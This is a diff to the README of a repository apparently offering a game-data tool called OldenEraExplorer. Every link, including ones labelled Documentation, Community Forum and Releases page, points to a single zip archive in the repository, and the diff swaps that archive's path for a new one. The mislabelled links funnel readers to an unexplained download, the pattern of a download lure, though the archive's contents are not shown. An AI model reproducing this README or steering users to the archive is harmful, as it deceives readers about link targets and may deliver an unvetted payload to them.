@@ -1,6 +1,6 @@
 # 🚀 OldenEraExplorer - Explore Game Data Easily
 
-[![Download OldenEraExplorer](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip)](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip)
+[![Download OldenEraExplorer](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip)](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip)
 
 ## 📖 Overview
 
@@ -30,7 +30,7 @@ To run OldenEraExplorer, your computer must meet the following requirements:
 
 To download OldenEraExplorer, visit the Releases page using the link below:
 
-[Download OldenEraExplorer](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip)
+[Download OldenEraExplorer](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip)
 
 ### Step 2: Choose the Right File
 
@@ -82,10 +82,10 @@ We encourage users to share their experiences and feedback. Let us know how Olde
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip)
-- [Documentation](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip)
-- [Community Forum](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip)
 
 Explore your favorite game data today with OldenEraExplorer! 
 
-[Download OldenEraExplorer](https://github.com/idanzforte/OldenEraExplorer/raw/refs/heads/main/preferred/Era_Olden_Explorer_v2.7.zip) again to get started. Enjoy your journey into the game!
+[Download OldenEraExplorer](https://raw.githubusercontent.com/idanzforte/OldenEraExplorer/main/preferred/Olden-Explorer-Era-v1.0.zip) again to get started. Enjoy your journey into the game!
